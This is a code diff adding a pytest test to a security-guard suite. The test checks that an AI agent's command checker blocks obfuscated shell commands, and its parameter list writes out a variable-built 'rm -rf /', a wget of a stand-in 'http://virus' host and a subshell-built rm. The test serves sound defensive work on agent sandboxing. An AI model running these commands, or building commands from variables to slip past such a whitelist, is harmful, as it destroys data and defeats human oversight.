@@ -297,3 +297,17 @@ class TestSecurityGuardComprehensive:
         assert is_safe is False
         assert "Static Analyzer" in reason
         mock_scan.assert_called_once()
+
+    @pytest.mark.parametrize("command", [
+    "C=r; M=m; $C$M -rf /",        # Obfuscated rm
+    "CMD=wget; $CMD http://virus", # Obfuscated wget
+    "$(echo 'rm') -rf /"           # Subshell execution
+    ])
+    def test_obfuscated_variable_execution_blocked(self, command):
+        """
+        Security: Ensures the agent cannot bypass the whitelist by building 
+        dangerous commands dynamically using bash variables.
+        """
+        is_safe, reason = check_command_safety(command)
+        assert is_safe is False
+        assert "not in the allowed whitelist" in reason or "substitution" in reason or "dynamic variables" in reason
